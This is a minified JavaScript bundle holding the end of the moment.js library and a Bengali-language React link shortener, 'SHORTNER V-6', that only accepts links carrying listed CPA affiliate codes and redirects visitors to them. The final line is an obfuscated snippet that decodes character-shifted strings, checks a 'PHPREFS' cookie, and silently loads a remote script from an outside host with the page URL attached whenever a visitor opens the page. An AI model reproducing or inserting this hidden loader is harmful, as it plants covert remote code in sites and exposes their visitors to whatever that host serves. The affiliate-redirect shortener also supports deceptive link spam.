r,i,s,o,a,l=this.eras();for(e=e.toUpperCase(),r=0,i=l.length;r<i;++r)if(s=l[r].name.toUpperCase(),o=l[r].abbr.toUpperCase(),a=l[r].narrow.toUpperCase(),n)switch(t){case"N":case"NN":case"NNN":if(o===e)return l[r];break;case"NNNN":if(s===e)return l[r];break;case"NNNNN":if(a===e)return l[r]}else if([s,o,a].indexOf(e)>=0)return l[r]}function Mi(e,t){var n=e.since<=e.until?1:-1;return void 0===t?r(e.since).year():r(e.since).year()+(t-e.offset)*n}function Ni(){var e,t,n,r=this.localeData().eras();for(e=0,t=r.length;e<t;++e)if(n=this.clone().startOf("day").valueOf(),r[e].since<=n&&n<=r[e].until||r[e].until<=n&&n<=r[e].since)return r[e].name;return""}function Ai(){var e,t,n,r=this.localeData().eras();for(e=0,t=r.length;e<t;++e)if(n=this.clone().startOf("day").valueOf(),r[e].since<=n&&n<=r[e].until||r[e].until<=n&&n<=r[e].since)return r[e].narrow;return""}function Li(){var e,t,n,r=this.localeData().eras();for(e=0,t=r.length;e<t;++e)if(n=this.clone().startOf("day").valueOf(),r[e].since<=n&&n<=r[e].until||r[e].until<=n&&n<=r[e].since)return r[e].abbr;return""}function Oi(){var e,t,n,i,s=this.localeData().eras();for(e=0,t=s.length;e<t;++e)if(n=s[e].since<=s[e].until?1:-1,i=this.clone().startOf("day").valueOf(),s[e].since<=i&&i<=s[e].until||s[e].until<=i&&i<=s[e].since)return(this.year()-r(s[e].since).year())*n+s[e].offset;return this.year()}function Ri(e){return a(this,"_erasNameRegex")||$i.call(this),e?this._erasNameRegex:this._erasRegex}function Pi(e){return a(this,"_erasAbbrRegex")||$i.call(this),e?this._erasAbbrRegex:this._erasRegex}function Fi(e){return a(this,"_erasNarrowRegex")||$i.call(this),e?this._erasNarrowRegex:this._erasRegex}function Vi(e,t){return t.erasAbbrRegex(e)}function Ui(e,t){return t.erasNameRegex(e)}function Bi(e,t){return t.erasNarrowRegex(e)}function zi(e,t){return t._eraYearOrdinalRegex||Ce}function $i(){var e,t,n=[],r=[],i=[],s=[],o=this.eras();for(e=0,t=o.length;e<t;++e)r.push(Fe(o[e].name)),n.push(Fe(o[e].abbr)),i.push(Fe(o[e].narrow)),s.push(Fe(o[e].name)),s.push(Fe(o[e].abbr)),s.push(Fe(o[e].narrow));this._erasRegex=new RegExp("^("+s.join("|")+")","i"),this._erasNameRegex=new RegExp("^("+r.join("|")+")","i"),this._erasAbbrRegex=new RegExp("^("+n.join("|")+")","i"),this._erasNarrowRegex=new RegExp("^("+i.join("|")+")","i")}function ji(e,t){B(0,[e,e.length],0,t)}function qi(e){return Qi.call(this,e,this.week(),this.weekday(),this.localeData()._week.dow,this.localeData()._week.doy)}function Gi(e){return Qi.call(this,e,this.isoWeek(),this.isoWeekday(),1,4)}function Wi(){return Et(this.year(),1,4)}function Ki(){return Et(this.isoWeekYear(),1,4)}function Yi(){var e=this.localeData()._week;return Et(this.year(),e.dow,e.doy)}function Hi(){var e=this.localeData()._week;return Et(this.weekYear(),e.dow,e.doy)}function Qi(e,t,n,r,i){var s;return null==e?St(this,r,i).year:(t>(s=Et(e,r,i))&&(t=s),Xi.call(this,e,t,n,r,i))}function Xi(e,t,n,r,i){var s=_t(e,t,n,r,i),o=wt(s.year,0,s.dayOfYear);return this.year(o.getUTCFullYear()),this.month(o.getUTCMonth()),this.date(o.getUTCDate()),this}function Ji(e){return null==e?Math.ceil((this.month()+1)/3):this.month(3*(e-1)+this.month()%3)}B("N",0,0,"eraAbbr"),B("NN",0,0,"eraAbbr"),B("NNN",0,0,"eraAbbr"),B("NNNN",0,0,"eraName"),B("NNNNN",0,0,"eraNarrow"),B("y",["y",1],"yo","eraYear"),B("y",["yy",2],0,"eraYear"),B("y",["yyy",3],0,"eraYear"),B("y",["yyyy",4],0,"eraYear"),Oe("N",Vi),Oe("NN",Vi),Oe("NNN",Vi),Oe("NNNN",Ui),Oe("NNNNN",Bi),Ue(["N","NN","NNN","NNNN","NNNNN"],(function(e,t,n,r){var i=n._locale.erasParse(e,r,n._strict);i?g(n).era=i:g(n).invalidEra=e})),Oe("y",Ce),Oe("yy",Ce),Oe("yyy",Ce),Oe("yyyy",Ce),Oe("yo",zi),Ue(["y","yy","yyy","yyyy"],je),Ue(["yo"],(function(e,t,n,r){var i;n._locale._eraYearOrdinalRegex&&(i=e.match(n._locale._eraYearOrdinalRegex)),n._locale.eraYearOrdinalParse?t[je]=n._locale.eraYearOrdinalParse(e,i):t[je]=parseInt(e,10)})),B(0,["gg",2],0,(function(){return this.weekYear()%100})),B(0,["GG",2],0,(function(){return this.isoWeekYear()%100})),ji("gggg","weekYear"),ji("ggggg","weekYear"),ji("GGGG","isoWeekYear"),ji("GGGGG","isoWeekYear"),ne("weekYear","gg"),ne("isoWeekYear","GG"),oe("weekYear",1),oe("isoWeekYear",1),Oe("G",De),Oe("g",De),Oe("GG",Se,ve),Oe("gg",Se,ve),Oe("GGGG",xe,be),Oe("gggg",xe,be),Oe("GGGGG",Ie,_e),Oe("ggggg",Ie,_e),Be(["gggg","ggggg","GGGG","GGGGG"],(function(e,t,n,r){t[r.substr(0,2)]=ce(e)})),Be(["gg","GG"],(function(e,t,n,i){t[i]=r.parseTwoDigitYear(e)})),B("Q",0,"Qo","quarter"),ne("quarter","Q"),oe("quarter",7),Oe("Q",ye),Ue("Q",(function(e,t){t[qe]=3*(ce(e)-1)})),B("D",["DD",2],"Do","date"),ne("date","D"),oe("date",9),Oe("D",Se),Oe("DD",Se,ve),Oe("Do",(function(e,t){return e?t._dayOfMonthOrdinalParse||t._ordinalParse:t._dayOfMonthOrdinalParseLenient})),Ue(["D","DD"],Ge),Ue("Do",(function(e,t){t[Ge]=ce(e.match(Se)[0])}));var Zi=he("Date",!0);function es(e){var t=Math.round((this.clone().startOf("day")-this.clone().startOf("year"))/864e5)+1;return null==e?t:this.add(e-t,"d")}B("DDD",["DDDD",3],"DDDo","dayOfYear"),ne("dayOfYear","DDD"),oe("dayOfYear",4),Oe("DDD",ke),Oe("DDDD",we),Ue(["DDD","DDDD"],(function(e,t,n){n._dayOfYear=ce(e)})),B("m",["mm",2],0,"minute"),ne("minute","m"),oe("minute",14),Oe("m",Se),Oe("mm",Se,ve),Ue(["m","mm"],Ke);var ts=he("Minutes",!1);B("s",["ss",2],0,"second"),ne("second","s"),oe("second",15),Oe("s",Se),Oe("ss",Se,ve),Ue(["s","ss"],Ye);var ns,rs,is=he("Seconds",!1);for(B("S",0,0,(function(){return~~(this.millisecond()/100)})),B(0,["SS",2],0,(function(){return~~(this.millisecond()/10)})),B(0,["SSS",3],0,"millisecond"),B(0,["SSSS",4],0,(function(){return 10*this.millisecond()})),B(0,["SSSSS",5],0,(function(){return 100*this.millisecond()})),B(0,["SSSSSS",6],0,(function(){return 1e3*this.millisecond()})),B(0,["SSSSSSS",7],0,(function(){return 1e4*this.millisecond()})),B(0,["SSSSSSSS",8],0,(function(){return 1e5*this.millisecond()})),B(0,["SSSSSSSSS",9],0,(function(){return 1e6*this.millisecond()})),ne("millisecond","ms"),oe("millisecond",16),Oe("S",ke,ye),Oe("SS",ke,ve),Oe("SSS",ke,we),ns="SSSS";ns.length<=9;ns+="S")Oe(ns,Ce);function ss(e,t){t[He]=ce(1e3*("0."+e))}for(ns="S";ns.length<=9;ns+="S")Ue(ns,ss);function os(){return this._isUTC?"UTC":""}function as(){return this._isUTC?"Coordinated Universal Time":""}rs=he("Milliseconds",!1),B("z",0,0,"zoneAbbr"),B("zz",0,0,"zoneName");var ls=S.prototype;function us(e){return Hn(1e3*e)}function cs(){return Hn.apply(null,arguments).parseZone()}function hs(e){return e}ls.add=Or,ls.calendar=$r,ls.clone=jr,ls.diff=Qr,ls.endOf=yi,ls.format=ti,ls.from=ni,ls.fromNow=ri,ls.to=ii,ls.toNow=si,ls.get=pe,ls.invalidAt=xi,ls.isAfter=qr,ls.isBefore=Gr,ls.isBetween=Wr,ls.isSame=Kr,ls.isSameOrAfter=Yr,ls.isSameOrBefore=Hr,ls.isValid=Ti,ls.lang=ai,ls.locale=oi,ls.localeData=li,ls.max=Xn,ls.min=Qn,ls.parsingFlags=ki,ls.set=me,ls.startOf=gi,ls.subtract=Rr,ls.toArray=_i,ls.toObject=Si,ls.toDate=bi,ls.toISOString=Zr,ls.inspect=ei,typeof Symbol<"u"&&null!=Symbol.for&&(ls[Symbol.for("nodejs.util.inspect.custom")]=function(){return"Moment<"+this.format()+">"}),ls.toJSON=Ei,ls.toString=Jr,ls.unix=wi,ls.valueOf=vi,ls.creationData=Ii,ls.eraName=Ni,ls.eraNarrow=Ai,ls.eraAbbr=Li,ls.eraYear=Oi,ls.year=gt,ls.isLeapYear=yt,ls.weekYear=qi,ls.isoWeekYear=Gi,ls.quarter=ls.quarters=Ji,ls.month=ct,ls.daysInMonth=ht,ls.week=ls.weeks=Ct,ls.isoWeek=ls.isoWeeks=Dt,ls.weeksInYear=Yi,ls.weeksInWeekYear=Hi,ls.isoWeeksInYear=Wi,ls.isoWeeksInISOWeekYear=Ki,ls.date=Zi,ls.day=ls.days=qt,ls.weekday=Gt,ls.isoWeekday=Wt,ls.dayOfYear=es,ls.hour=ls.hours=rn,ls.minute=ls.minutes=ts,ls.second=ls.seconds=is,ls.millisecond=ls.milliseconds=rs,ls.utcOffset=mr,ls.utc=yr,ls.local=vr,ls.parseZone=wr,ls.hasAlignedHourOffset=br,ls.isDST=_r,ls.isLocal=Er,ls.isUtcOffset=Tr,ls.isUtc=kr,ls.isUTC=kr,ls.zoneAbbr=os,ls.zoneName=as,ls.dates=k("dates accessor is deprecated. Use date instead.",Zi),ls.months=k("months accessor is deprecated. Use month instead",ct),ls.years=k("years accessor is deprecated. Use year instead",gt),ls.zone=k("moment().zone is deprecated, use moment().utcOffset instead. http://momentjs.com/guides/#/warnings/zone/",gr),ls.isDSTShifted=k("isDSTShifted is deprecated. See http://momentjs.com/guides/#/warnings/dst-shifted/ for more information",Sr);var ds=A.prototype;function fs(e,t,n,r){var i=vn(),s=p().set(r,t);return i[n](s,e)}function ps(e,t,n){if(c(e)&&(t=e,e=void 0),e=e||"",null!=t)return fs(e,t,n,"month");var r,i=[];for(r=0;r<12;r++)i[r]=fs(e,r,n,"month");return i}function ms(e,t,n,r){"boolean"==typeof e?(c(t)&&(n=t,t=void 0),t=t||""):(n=t=e,e=!1,c(t)&&(n=t,t=void 0),t=t||"");var i,s=vn(),o=e?s._week.dow:0,a=[];if(null!=n)return fs(t,(n+o)%7,r,"day");for(i=0;i<7;i++)a[i]=fs(t,(i+o)%7,r,"day");return a}function gs(e,t){return ps(e,t,"months")}function ys(e,t){return ps(e,t,"monthsShort")}function vs(e,t,n){return ms(e,t,n,"weekdays")}function ws(e,t,n){return ms(e,t,n,"weekdaysShort")}function bs(e,t,n){return ms(e,t,n,"weekdaysMin")}ds.calendar=O,ds.longDateFormat=W,ds.invalidDate=Y,ds.ordinal=X,ds.preparse=hs,ds.postformat=hs,ds.relativeTime=Z,ds.pastFuture=ee,ds.set=M,ds.eras=Ci,ds.erasParse=Di,ds.erasConvertYear=Mi,ds.erasAbbrRegex=Pi,ds.erasNameRegex=Ri,ds.erasNarrowRegex=Fi,ds.months=st,ds.monthsShort=ot,ds.monthsParse=lt,ds.monthsRegex=ft,ds.monthsShortRegex=dt,ds.week=Tt,ds.firstDayOfYear=It,ds.firstDayOfWeek=xt,ds.weekdays=Ut,ds.weekdaysMin=zt,ds.weekdaysShort=Bt,ds.weekdaysParse=jt,ds.weekdaysRegex=Kt,ds.weekdaysShortRegex=Yt,ds.weekdaysMinRegex=Ht,ds.isPM=tn,ds.meridiem=sn,mn("en",{eras:[{since:"0001-01-01",until:1/0,offset:1,name:"Anno Domini",narrow:"AD",abbr:"AD"},{since:"0000-12-31",until:-1/0,offset:1,name:"Before Christ",narrow:"BC",abbr:"BC"}],dayOfMonthOrdinalParse:/\d{1,2}(th|st|nd|rd)/,ordinal:function(e){var t=e%10;return e+(1===ce(e%100/10)?"th":1===t?"st":2===t?"nd":3===t?"rd":"th")}}),r.lang=k("moment.lang is deprecated. Use moment.locale instead.",mn),r.langData=k("moment.langData is deprecated. Use moment.localeData instead.",vn);var _s=Math.abs;function Ss(){var e=this._data;return this._milliseconds=_s(this._milliseconds),this._days=_s(this._days),this._months=_s(this._months),e.milliseconds=_s(e.milliseconds),e.seconds=_s(e.seconds),e.minutes=_s(e.minutes),e.hours=_s(e.hours),e.months=_s(e.months),e.years=_s(e.years),this}function Es(e,t,n,r){var i=Cr(t,n);return e._milliseconds+=r*i._milliseconds,e._days+=r*i._days,e._months+=r*i._months,e._bubble()}function Ts(e,t){return Es(this,e,t,1)}function ks(e,t){return Es(this,e,t,-1)}function xs(e){return e<0?Math.floor(e):Math.ceil(e)}function Is(){var e,t,n,r,i,s=this._milliseconds,o=this._days,a=this._months,l=this._data;return s>=0&&o>=0&&a>=0||s<=0&&o<=0&&a<=0||(s+=864e5*xs(Ds(a)+o),o=0,a=0),l.milliseconds=s%1e3,e=ue(s/1e3),l.seconds=e%60,t=ue(e/60),l.minutes=t%60,n=ue(t/60),l.hours=n%24,o+=ue(n/24),a+=i=ue(Cs(o)),o-=xs(Ds(i)),r=ue(a/12),a%=12,l.days=o,l.months=a,l.years=r,this}function Cs(e){return 4800*e/146097}function Ds(e){return 146097*e/4800}function Ms(e){if(!this.isValid())return NaN;var t,n,r=this._milliseconds;if("month"===(e=re(e))||"quarter"===e||"year"===e)switch(t=this._days+r/864e5,n=this._months+Cs(t),e){case"month":return n;case"quarter":return n/3;case"year":return n/12}else switch(t=this._days+Math.round(Ds(this._months)),e){case"week":return t/7+r/6048e5;case"day":return t+r/864e5;case"hour":return 24*t+r/36e5;case"minute":return 1440*t+r/6e4;case"second":return 86400*t+r/1e3;case"millisecond":return Math.floor(864e5*t)+r;default:throw new Error("Unknown unit "+e)}}function Ns(){return this.isValid()?this._milliseconds+864e5*this._days+this._months%12*2592e6+31536e6*ce(this._months/12):NaN}function As(e){return function(){return this.as(e)}}var Ls=As("ms"),Os=As("s"),Rs=As("m"),Ps=As("h"),Fs=As("d"),Vs=As("w"),Us=As("M"),Bs=As("Q"),zs=As("y");function $s(){return Cr(this)}function js(e){return e=re(e),this.isValid()?this[e+"s"]():NaN}function qs(e){return function(){return this.isValid()?this._data[e]:NaN}}var Gs=qs("milliseconds"),Ws=qs("seconds"),Ks=qs("minutes"),Ys=qs("hours"),Hs=qs("days"),Qs=qs("months"),Xs=qs("years");function Js(){return ue(this.days()/7)}var Zs=Math.round,eo={ss:44,s:45,m:45,h:22,d:26,w:null,M:11};function to(e,t,n,r,i){return i.relativeTime(t||1,!!n,e,r)}function no(e,t,n,r){var i=Cr(e).abs(),s=Zs(i.as("s")),o=Zs(i.as("m")),a=Zs(i.as("h")),l=Zs(i.as("d")),u=Zs(i.as("M")),c=Zs(i.as("w")),h=Zs(i.as("y")),d=s<=n.ss&&["s",s]||s<n.s&&["ss",s]||o<=1&&["m"]||o<n.m&&["mm",o]||a<=1&&["h"]||a<n.h&&["hh",a]||l<=1&&["d"]||l<n.d&&["dd",l];return null!=n.w&&(d=d||c<=1&&["w"]||c<n.w&&["ww",c]),(d=d||u<=1&&["M"]||u<n.M&&["MM",u]||h<=1&&["y"]||["yy",h])[2]=t,d[3]=+e>0,d[4]=r,to.apply(null,d)}function ro(e){return void 0===e?Zs:"function"==typeof e&&(Zs=e,!0)}function io(e,t){return void 0!==eo[e]&&(void 0===t?eo[e]:(eo[e]=t,"s"===e&&(eo.ss=t-1),!0))}function so(e,t){if(!this.isValid())return this.localeData().invalidDate();var n,r,i=!1,s=eo;return"object"==typeof e&&(t=e,e=!1),"boolean"==typeof e&&(i=e),"object"==typeof t&&(s=Object.assign({},eo,t),null!=t.s&&null==t.ss&&(s.ss=t.s-1)),r=no(this,!i,s,n=this.localeData()),i&&(r=n.pastFuture(+this,r)),n.postformat(r)}var oo=Math.abs;function ao(e){return(e>0)-(e<0)||+e}function lo(){if(!this.isValid())return this.localeData().invalidDate();var e,t,n,r,i,s,o,a,l=oo(this._milliseconds)/1e3,u=oo(this._days),c=oo(this._months),h=this.asSeconds();return h?(e=ue(l/60),t=ue(e/60),l%=60,e%=60,n=ue(c/12),c%=12,r=l?l.toFixed(3).replace(/\.?0+$/,""):"",i=h<0?"-":"",s=ao(this._months)!==ao(h)?"-":"",o=ao(this._days)!==ao(h)?"-":"",a=ao(this._milliseconds)!==ao(h)?"-":"",i+"P"+(n?s+n+"Y":"")+(c?s+c+"M":"")+(u?o+u+"D":"")+(t||e||l?"T":"")+(t?a+t+"H":"")+(e?a+e+"M":"")+(l?a+r+"S":"")):"P0D"}var uo=or.prototype;//! moment.js
return uo.isValid=ir,uo.abs=Ss,uo.add=Ts,uo.subtract=ks,uo.as=Ms,uo.asMilliseconds=Ls,uo.asSeconds=Os,uo.asMinutes=Rs,uo.asHours=Ps,uo.asDays=Fs,uo.asWeeks=Vs,uo.asMonths=Us,uo.asQuarters=Bs,uo.asYears=zs,uo.valueOf=Ns,uo._bubble=Is,uo.clone=$s,uo.get=js,uo.milliseconds=Gs,uo.seconds=Ws,uo.minutes=Ks,uo.hours=Ys,uo.days=Hs,uo.weeks=Js,uo.months=Qs,uo.years=Xs,uo.humanize=so,uo.toISOString=lo,uo.toString=lo,uo.toJSON=lo,uo.locale=oi,uo.localeData=li,uo.toIsoString=k("toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)",lo),uo.lang=ai,B("X",0,0,"unix"),B("x",0,0,"valueOf"),Oe("x",De),Oe("X",Ae),Ue("X",(function(e,t,n){n._d=new Date(1e3*parseFloat(e))})),Ue("x",(function(e,t,n){n._d=new Date(ce(e))})),r.version="2.29.4",i(Hn),r.fn=ls,r.min=Zn,r.max=er,r.now=tr,r.utc=p,r.unix=us,r.months=gs,r.isDate=h,r.locale=mn,r.invalid=v,r.duration=Cr,r.isMoment=E,r.weekdays=vs,r.parseZone=cs,r.localeData=vn,r.isDuration=ar,r.monthsShort=ys,r.weekdaysMin=bs,r.defineLocale=gn,r.updateLocale=yn,r.locales=wn,r.weekdaysShort=ws,r.normalizeUnits=re,r.relativeTimeRounding=ro,r.relativeTimeThreshold=io,r.calendarFormat=zr,r.prototype=ls,r.HTML5_FMT={DATETIME_LOCAL:"YYYY-MM-DDTHH:mm",DATETIME_LOCAL_SECONDS:"YYYY-MM-DDTHH:mm:ss",DATETIME_LOCAL_MS:"YYYY-MM-DDTHH:mm:ss.SSS",DATE:"YYYY-MM-DD",TIME:"HH:mm",TIME_SECONDS:"HH:mm:ss",TIME_MS:"HH:mm:ss.SSS",WEEK:"GGGG-[W]WW",MONTH:"YYYY-MM"},r}()}(mk);var P3=mk.exports;const $3=xg(P3);function L3(){const[e,t]=$.useState(""),[n,r]=$.useState(""),[i,s]=$.useState(!1),[o,a]=$.useState(!1);return pe.jsxs("header",{className:"flex flex-col gap-5 bg-gradient-to-t to-green-400 from-indigo-500 min-h-screen",children:[o&&pe.jsx("div",{className:"flex fixed h-screen w-full  justify-center items-center backdrop-blur-lg bg-gray-800/10",children:pe.jsx("button",{className:"btn btn-circle loading"})}),pe.jsxs("div",{className:"lg:w-1/4 lg:mx-auto text-center",children:[pe.jsx("h1",{className:"mt-5 text-center text-3xl font-semibold text-primary",children:"SHORTNER V-6"}),pe.jsx("p",{className:"text-center bg-gray-900/75 mx-2 rounded mb-2 py-3 mt-10",children:"শর্টনার সার্ভিস নেয়ার জন্য নিচে WhatsApp Button-এ ক্লিক করুন 👇"}),pe.jsxs("p",{className:"font-bold  text-2xl flex items-center justify-center py-2 gap-2 text-center rounded mx-2 text-primary bg-gray-300/75",children:[pe.jsx("a",{className:"text-xl btn btn-success btn-sm btn-circle text-white",href:"https://wa.me/message/XXYZ5UQC2REFL1",children:pe.jsx(X9,{})}),"01660037359"]})]}),pe.jsxs("form",{className:"flex flex-col items-center justify-center lg:w-1/4 lg:mx-auto  mx-2 gap-3 bg-gray-900/75 p-7 rounded",onSubmit:async t=>{if(t.preventDefault(),a(!0),!["162059&sm","153277","185440&s2","147255&sm","183045&s2","188878&s2","165078&s2","aqa8kwf&o","147255&s2","177685&s2","142414&s2","191734&s2","186882&s2","opnfnl&s1","179135&s2","149196&s2","164761&s2"].some((t=>e.includes(t))))return a(!1),void Ue.error('ভাই আপনার "CPA" প্রোফাইল রেজিস্টার করা নাই 😥। আমাদের শর্টনার সার্ভিস নিতে চাইলে নিচে WhatsApp icon-এ ক্লিক করে যোগাযোগ করুন।');const n={mainDomain:window.location.origin,input:e},i=b3.generate();await Jv.collection("urls").add({url:n,slug:i}),a(!1),r(`${window.location.origin}/${i}`),s(!0)},children:[pe.jsx("input",{type:"text",placeholder:"এখানে লিংক দেন",className:"input input-bordered input-primary w-full max-w-xs",value:e,onChange:e=>t(e.target.value)}),pe.jsxs("button",{type:"submit",className:"btn w-full btn-active btn-primary mt-3",children:[pe.jsx(J9,{className:"mr-2"}),"লিংক শর্ট করেন"]}),i&&pe.jsxs("div",{className:"mt-3",children:[pe.jsx("input",{type:"text",className:"input input-bordered input-primary w-full max-w-xs",value:n,readOnly:!0}),pe.jsxs("button",{type:"button",onClick:async()=>{try{await navigator.clipboard.writeText(n),Ue.success("লিংক কপি হইছে ভাই, এখন স্ন্যাপে মারেন 😁😁।")}catch(e){console.error("Failed to copy: ",e)}},className:"btn btn-primary w-full mt-3",children:[pe.jsx(lk,{className:"mr-2"})," শর্ট লিংক কপি করেন"]})]})]}),pe.jsxs("p",{className:"text-center",children:[pe.jsx("b",{children:"Updated: "}),$3("2023-05-06, 02:20, am","YYYYMMDD, hh:mm, a").fromNow()]}),pe.jsx(ad,{})]})}const F3=()=>{const{slug:e}=x2();return $.useEffect((()=>{Jv.collection("urls").where("slug","==",e).onSnapshot((e=>{e.empty&&alert("URL not found");let t=e.docs[0].data().url.input;window.location.href=t}))}),[e]),pe.jsx("h2",{className:"text-center my-5 italic text-3xl text-green-600",children:"WELCOME"})},V3=Bb([{path:"/",element:pe.jsx(l3,{})},{path:"/:slug",element:pe.jsx(a3,{})},{path:"/shortener",element:pe.jsx(L3,{})},{path:"/gone/:slug",element:pe.jsx(F3,{})}]),U3=$p.createRoot(document.getElementById("root"));U3.render(pe.jsx(Ee.StrictMode,{children:pe.jsx(bb,{router:V3})})),EA();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));